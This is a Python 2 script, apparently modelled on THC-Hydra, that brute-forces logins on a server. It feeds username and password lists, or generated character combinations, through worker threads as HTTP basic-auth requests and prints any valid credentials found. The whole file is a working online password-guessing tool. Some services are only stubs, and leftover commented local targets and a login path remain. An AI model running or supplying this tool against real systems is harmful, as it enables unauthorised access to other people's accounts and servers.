#!/usr/bin/python

"""
Crack some passwords...

Inspired by https://www.thc.org/thc-hydra/

"""

import os
import sys
import argparse
import requests
from requests.exceptions import ConnectionError
import string
from itertools import product
from Queue import Queue
import threading
from threading import Thread
import signal
import atexit
import time
from datetime import timedelta
from babel.dates import format_timedelta
import socket
from urlparse import urlparse


args = None
start_time = time.time()
iteration_count = 0
login_count = 0
password_count = 0
input_queue = Queue(10000)
stdout_queue = Queue()
valid_logins = Queue()


def login_generator():
    global login_count

    if args.login:
        users = args.login.split(os.getenv('IFS', ','))
        login_count = len(users)
        for user in users:
            yield user

    elif args.login_file:
        with open(args.login_file) as fh:
            lines = fh.readlines()
        login_count = len(lines)
        for line in lines:
            yield line.strip()


def password_generator():
    global password_count

    if args.password:
        passwords = args.password.split(os.getenv('IFS', ','))
        password_count = len(passwords)
        for password in passwords:
            yield password

    elif args.password_file:
        with open(args.password_file) as fh:
            lines = fh.readlines()
            password_count = len(lines)
        for line in lines:
            yield line.strip()

    elif args.brute_force:
        _min, _max, opts = args.brute_force.split(':', 2)
        if not all([_min, _max, opts]):
            raise Exception('invalid brute force arg')
        _min = int(_min)
        _max = int(_max)
        assert _min > 0
        assert _max >= _min

        chars = ''
        if 'a' in opts:
            chars += string.lowercase
        if 'A' in opts:
            chars += string.uppercase
        if '1' in opts:
            chars += string.digits
        opts = opts.translate(None, 'aA1')
        chars += opts

        for length in xrange(_min, _max + 1):
            password_count += len(chars) ** length

        for length in xrange(_min, _max + 1):
            for combo in product(chars, repeat=length):
                yield ''.join(combo)


def input_loader():
    global iteration_count

    try:
        done = False
        for login in login_generator():
            for password in password_generator():
                input_queue.put((login, password))

                iteration_count += 1
                if args.limit and iteration_count >= args.limit:
                    done = True
                    break
            if done:
                break

    finally:
        # load sentinal values into queue to terminate workers
        for i in xrange(args.threads):
            input_queue.put((None, None))


class Hacker(Thread):
    def __init__(self, args, **kwargs):
        Thread.__init__(self, **kwargs)
        self.server = args['server']

        if hasattr(self, 'init'):
            self.init(args)
        else:
            self.args = args

        self.setDaemon(True)
        self.start()

    def log(self, msg):
        stdout_queue.put(msg)

    def run(self):
        while True:
            # if a valid login has been found
            if not args.all and not valid_logins.empty():
                break

            login, password = input_queue.get()

            # sentinal value - all input has been processed
            if not login and not password:
                input_queue.task_done()
                break

            try:
                res = self.attempt(login, password)
            except:
                res = False

            if res:
                valid_logins.put((login, password))

            input_queue.task_done()

    def attempt(self, login, password):
        raise Exception('not implemented')


class HTTPHacker(Hacker):
    @staticmethod
    def getServiceName():
        raise Exception('not implemented')

    @classmethod
    def add_parser(cls, parent_parser):
        parser = parent_parser.add_parser(cls.getServiceName())
        group = parser.add_mutually_exclusive_group()
        group.set_defaults(method='POST')
        group.add_argument('--get', dest='method', action='store_const', const='GET')
        group.add_argument('--post', dest='method', action='store_const', const='POST')

        parser.add_argument('--ssl', action='store_true')
        parser.add_argument('--data', action='append', help='add form data')
        parser.add_argument('--header', action='append', help='add header to request')
        parser.add_argument('--cookie', action='append', help='add cookie to request')


class HTAccessHacker(HTTPHacker):
    @staticmethod
    def getServiceName():
        return 'htaccess'

    def init(self, args):
        self.success_str = args.get('success_str')
        self.fail_str = args.get('fail_str')

    def attempt(self, login, password):
        params = {
            # 'user': login,
            # 'pws': password,
        }

        # # res = requests.post('http://' + server + path, data=params)

        url = 'http://%s:%s@%s' % (login, password, self.server)
        if args.verbose:
            self.log(url)
        if args.debug:
            return False

        # make request
        res = requests.get(url, data=params)

        if self.success_str and self.success_str in res.text:
            return True
        elif self.fail_str and self.fail_str not in res.text:
            return True


def monitor_worker():
    while True:
        time.sleep(2)
        count = iteration_count - input_queue.qsize()
        if login_count and password_count:
            pct = count * 100 / (login_count * password_count)
        else:
            pct = 0
        time_str = format_timedelta(timedelta(seconds=(time.time() - start_time)), locale='en_US')
        stdout_queue.put('%d / %d  (%d%%) in %s' % (
            count, input_queue.qsize(), pct, time_str
        ))


def output_serializer():
    while True:
        item = stdout_queue.get()
        print item
        stdout_queue.task_done()


def abort_program(signum=None, frame=None):
    """  flush output and kill worker threads silently upon ^C  """

    # kill all of the worker threads
    for thread in threading.enumerate():
        thread.kill_received = True

    stdout_queue.join()
    sys.exit(1)


def shutdown(exception=None):
    """  should only be called after receiving ^C  """

    if iteration_count and login_count and password_count:
        print
        pct = iteration_count * 100 / (login_count * password_count)
        print 'iterations: %d   (%d%%)' % (iteration_count, pct)


def main():
    parser = argparse.ArgumentParser(epilog=__doc__)
    parser.add_argument('-A', '--all', action='store_true', help='find all valid logins')
    parser.add_argument('-d', '--debug', action='store_true')
    parser.add_argument('-v', '--verbose', action='count', default=0)
    parser.add_argument('-t', '--threads', type=int, default=16)
    parser.add_argument('--limit', type=int, default=0)

    group = parser.add_mutually_exclusive_group()
    group.add_argument('-l', '--login')
    group.add_argument('-L', '--login_file')

    group = parser.add_mutually_exclusive_group()
    group.add_argument('-p', '--password')
    group.add_argument('-P', '--password_file')
    group.add_argument('-x', dest='brute_force', help='min_size:max_size:chars')

    parser.add_argument('server')

    service_parsers = parser.add_subparsers(dest='service')
    service_parsers.add_parser('htaccess')
    service_parsers.add_parser('telnet')

    form_parser = service_parsers.add_parser('http-form')
    group = form_parser.add_mutually_exclusive_group()
    group.set_defaults(method='POST')
    group.add_argument('--get', dest='method', action='store_const', const='GET')
    group.add_argument('--post', dest='method', action='store_const', const='POST')

    form_parser.add_argument('--ssl', action='store_true')
    form_parser.add_argument('--data', action='append', help='add form data')
    form_parser.add_argument('--header', action='append', help='add header to request')
    form_parser.add_argument('--cookie', action='append', help='add cookie to request')

    global args
    args = parser.parse_args()

    # validate that input files exist
    if args.login_file:
        assert os.path.isfile(args.login_file)
    if args.password_file:
        assert os.path.isfile(args.password_file)

    # validate that server exists
    try:
        netloc = urlparse(args.server).netloc
        if not netloc:
            netloc = args.server

        netloc = socket.gethostbyname(netloc)
    except:
        raise ValueError('invalid server: ' + args.server)

    # print args
    # return

    # in case the program bails early
    signal.signal(signal.SIGINT, abort_program)
    atexit.register(shutdown)

    # start misc async helpers
    worker_fns = [
        output_serializer,
        monitor_worker,
        input_loader,
    ]

    for fn in worker_fns:
        t = Thread(target=fn, name=fn.__name__)
        t.setDaemon(True)
        t.start()

    kwargs = {
        # 'method': 'POST',
        'server': netloc,
        # 'server': '192.168.1.100',
        'path': '/login.asp',
        'success_str': None,
        'fail_str': 'Authorization required',
    }

    worker_type = None
    if args.service == 'htaccess':
        worker_type = HTAccessHacker
    elif args.server == 'http-form':
        pass
    else:
        raise TypeError('invalid service type: ' + args.service)

    # start the workers
    worker_threads = []
    for i in range(args.threads):
        name = 'hacker-%d' % i
        t = worker_type(kwargs, name=name)
        worker_threads.append(t)

    # method = 'POST'
    # server = '10.1.10.1'
    # path = '/login.asp'
    # success_str = ''
    # fail_str = 'Please enter login information'

    # server = '192.168.1.100'
    # fail_str = 'Authorization required'

    # wait for the workers to finish
    while worker_threads:
        workers = []
        for t in worker_threads:
            if t.isAlive():
                t.join(1)
                workers.append(t)
        worker_threads = workers

    # flush output buffer
    stdout_queue.join()

    # clear exit handler since we're terminating cleanly
    # hack, since python 2.7 doesn't support unregister
    atexit._exithandlers = []

    # print valid logins if we found any
    exit_code = 1
    if not valid_logins.empty():
        exit_code = 0
        if args.verbose:
            print
        while not valid_logins.empty():
            login, password = valid_logins.get()
            print "valid login: %s / %s" % (login, password)

    sys.exit(exit_code)


if __name__ == "__main__":
    main()
